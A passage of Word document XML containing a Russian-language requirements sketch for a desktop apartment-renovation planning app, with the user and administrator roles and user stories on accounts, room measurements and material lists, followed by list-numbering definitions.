    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Видение системы: </w:t>
      </w:r>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">система представляет собой </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>десктопное</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> приложение, позволяющее пользователю вводить данные квартиры в которой хочет сделать ремонт. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Пользовательские роли: </w:t>
      </w:r>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>пользователь, администратор.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00322095" w:rsidRDefault="00322095" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00322095" w:rsidRDefault="00322095" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00322095" w:rsidRDefault="00322095" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00322095" w:rsidRDefault="00322095" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Работа с пользовательскими историями: </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Разрабатываем истории по принципу </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Как</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;пользователь&gt;, я могу &lt;действие&gt;, для того, чтобы &lt;цель&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Как пользователь я могу использовать программу для собственных нужд.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Как администратор я могу вносить изменения в базу данных различные стройматериалы.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Как пользователь я могу вводить свои личные данные, чтобы завести учетную запись.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Должны быть введены настоящие данные пользователя.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Учетная запись должна быть уникальной.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Как пользователь я могу изменить данные учетной записи.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Как пользователь я могу удалить свою учетную запись.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Для удаления необходимо подтверждение администратора.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Как пользователь я могу ввести метраж своего помещения, для того, чтобы получить необходимые, рациональные вариации материалов для ремонта.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006D07EF" w:rsidRPr="006D07EF" w:rsidRDefault="006D07EF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Как пользователь я могу хранить результаты своего списка материалов для ремонта помещений.</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="0"/>
    <w:p w:rsidR="00073DDF" w:rsidRPr="006D07EF" w:rsidRDefault="00073DDF" w:rsidP="00322095">
      <w:pPr>
        <w:spacing w:after="3" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00073DDF" w:rsidRPr="006D07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01B0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B91C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55E9F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="79DE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A0D6C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="35B237F4"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="2"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="375" w:hanging="375"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:color w:val="000000" w:themeColor="text1"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1095" w:hanging="375"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:color w:val="000000" w:themeColor="text1"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="720"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:color w:val="000000" w:themeColor="text1"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3240" w:hanging="1080"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:color w:val="000000" w:themeColor="text1"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3960" w:hanging="1080"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:color w:val="000000" w:themeColor="text1"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="1440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:color w:val="000000" w:themeColor="text1"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6.%7"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="1440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:color w:val="000000" w:themeColor="text1"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6.%7.%8"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6840" w:hanging="1800"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:color w:val="000000" w:themeColor="text1"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6.%7.%8.%9"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="7920" w:hanging="2160"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:color w:val="000000" w:themeColor="text1"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="3" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0DD90349"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="84B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FF6AB1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BD6C6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A80772"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C716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E6C8C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="BB0C4984"/>
    <w:lvl w:ilvl="0" w:tplc="1F52EA30">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7" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="241F7BB6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="71E265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BE35A9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A27E4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4C00270"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="501A878A"/>
    <w:lvl w:ilvl="0" w:tplc="3F144376">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="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1EFB5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161DC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78073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5CB5C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7EE58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CA452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C4C50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F677D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0311596"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="10BA2A90"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:eastAsiaTheme="minorHAnsi"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2621012"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="611E5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5E5EAA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B380C92E"/>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35234C0C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5F6C28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E22370"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="50C4E4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B323C26"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1076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341938"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D332E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02875DE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="52E8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E3968"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F86CC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66035"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5110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A30D53"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="ACC2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02D137D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="92F684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614B75"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="282EE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39E1CA2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="590CA5E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15:restartNumberingAfterBreak="0">
    <w:nsid w:val="54E64C97"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C2222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57D55FF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A16AC7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B836893"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5868FA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BB50678"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="10BA2A90"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:eastAsiaTheme="minorHAnsi"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5D31764A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="822A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6A7AF3"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="264CA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EF2293F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="10BA2A90"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:eastAsiaTheme="minorHAnsi"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15:restartNumberingAfterBreak="0">
    <w:nsid w:val="64710A54"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="EA9612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BB7244"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C602C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9117E6F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="6D7EF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9BE6A9C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AAC011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CC62F59"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4946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D464D8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F6CC97FA"/>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727B1D37"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D89EC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4081B49"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3F261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6A560E2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0854D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9E5061E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="10BA2A90"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:eastAsiaTheme="minorHAnsi"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7FCE48F3"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="7E8C2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30"/>
  </w:num>
  <w:num w:numId="3">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="4">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="5">
    <w:abstractNumId w:val="40"/>
  </w:num>
  <w:num w:numId="6">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="7">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="8">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="9">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="10">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="11">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="41"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="36"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="38"/>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="23">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="24">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="25">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="26">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="27">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="28">
    <w:abstractNumId w:val="39"/>
  </w:num>
  <w:num w:numId="29">
    <w:abstractNumId w:val="37"/>
  </w:num>
  <w:num w:numId="30">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="31">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="32">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="33">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="34">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="35">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="36">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="37">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="38">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="39">
    <w:abstractNumId w:val="0"/>
